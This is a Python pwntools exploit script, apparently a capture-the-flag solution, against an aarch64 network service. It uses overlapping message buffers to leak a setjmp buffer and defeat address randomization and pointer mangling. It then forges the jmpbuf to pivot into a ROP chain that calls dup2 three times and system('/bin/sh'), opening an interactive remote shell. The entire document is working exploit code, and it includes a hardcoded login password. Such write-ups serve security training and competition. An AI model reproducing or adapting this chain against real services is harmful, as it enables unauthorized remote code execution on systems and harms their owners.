from pwn import *

context.update(arch="aarch64")
if args.DEBUG:
    context.update(log_level="debug")

if args.LOCAL:
    s = remote("focal", 1336); local = True
else:
    s = remote("device.quatre-qu.art", 8080); local = False

if not local:
    log.info("Logging in...")
    s.recvuntil(b"password:")
    s.sendline(b"fudmH/MGzgUM7Zx3k6xMuvThTXh+ULf1")
    s.recvuntil(b"b'")
    suffix = s.recvuntil(b"'", drop=True)
    log.info("Solving challenge (suffix=%s)...", suffix)
    prefix = subprocess.check_output([sys.executable, "chalsolve.py", suffix.decode()]).strip()
    s.sendline(prefix)
    log.info("Ready!")

menucount = 0
def menu(opt):
    global menucount
    menucount += 1
    s.send(opt.encode() + b"\n")

def menusync():
    global menucount
    while menucount:
        s.recvuntil(b"Option:")
        menucount -= 1

def sendint(n):
    s.sendline(str(n).encode())

def crc(msg):
    import zlib
    return "{:08x}".format(zlib.crc32(msg) & 0xffffffff)

def bad_msg(content):
    menu("E")
    menu("A")
    sendint(len(content))
    sendint(1)
    menu("n")
    s.sendline(content)
    s.sendline(b"00000000")

# fill msgs
for i in range(10):
    bad_msg(b"a")

# insert extra msg, throw exception on msg size
menu("E")
menu("A")
sendint(999)

# insert one more to overlap jmpbuf, throw exception on hex choice
menu("E")
menu("A")
sendint(256)
sendint(9)
menu("?")

# leak jmpbuf
menu("E")
menu("V")
menu("y")
menusync()
s.recvuntil(b"Message 9: ")
leak = bytes.fromhex(s.recvline().decode())

exe_base = u64(leak[0x18:0x20]) - 0x4060
log.info("exe base: %x", exe_base)
ptr_guard = u64(leak[0x80:0x88]) ^ (exe_base + 0x1f8c)
log.info("ptr guard: %x", ptr_guard)
stack_addr = u64(leak[0x90:0x98]) ^ ptr_guard
log.info("stack addr: %x", stack_addr)
libc_base = u64(leak[0x38:0x40]) - 0x151000
log.info("libc base: %x", libc_base)

# clear messages via password check
menu("B")
menu("A")
menu("R")
s.sendline(b"not-the-passwordnot-the-password")
menusync()

## Phase 2: Setjmp->ROP
client_fd = 5
new_stackaddr = exe_base + 0x15590
new_jmpbuf = bytearray(leak)
new_jmpbuf[0x80:0x88] = p64(ptr_guard ^ (exe_base + 0x249c)) # in readall
new_jmpbuf[0x90:0x98] = p64(ptr_guard ^ new_stackaddr)
rop = flat([
    0, exe_base + 0x23b4, # => write, for sanity check
        new_stackaddr + 0x30, p32(0xaaaaaaaa), p32(client_fd), 0, 0,
    0, libc_base + 0x000dda08, # ldp x0, x1, [sp, #0x20]; ldp x29, x30, [sp], #0x30; ret; 
        exe_base + 0x1502c, p32(16), p32(client_fd),
    0, libc_base + 0xbc8e0, # dup2
        0, 0, 5, 0,
    0, libc_base + 0x000dda08, # ldp x0, x1, [sp, #0x20]; ldp x29, x30, [sp], #0x30; ret; 
        0, 0,
    0, libc_base + 0xbc8e0, # dup2
        0, 0, 5, 1,
    0, libc_base + 0x000dda08, # ldp x0, x1, [sp, #0x20]; ldp x29, x30, [sp], #0x30; ret; 
        0, 0,
    0, libc_base + 0xbc8e0, # dup2
        0, 0, 5, 2,
    0, libc_base + 0x000dda08, # ldp x0, x1, [sp, #0x20]; ldp x29, x30, [sp], #0x30; ret; 
        0, 0,
    0, libc_base + 0x47734, # system
        0, 0, exe_base + 0x159e0, 0,
])
rop1 = bytearray(rop[:0x30])
rop2 = rop[0x30:]
rop1[0x18:0x1c] = p32(len(rop2))
log.info("sending %d-byte rop", len(rop2))

# fill msgs
bad_msg(b"Hello from ROP!\n")
for i in range(4):
    bad_msg(b"a")
bad_msg(rop1)
for i in range(3):
    bad_msg(b"a")
bad_msg(b"/bin/sh\0")

# insert extra msg, throw exception on msg size
menu("E")
menu("A")
sendint(999)

# insert one more to overlap jmpbuf, throw exception on crc to longjmp
bad_msg(new_jmpbuf)

s.send(rop2)
s.recvuntil(b"Hello from ROP!\n")

s.interactive()
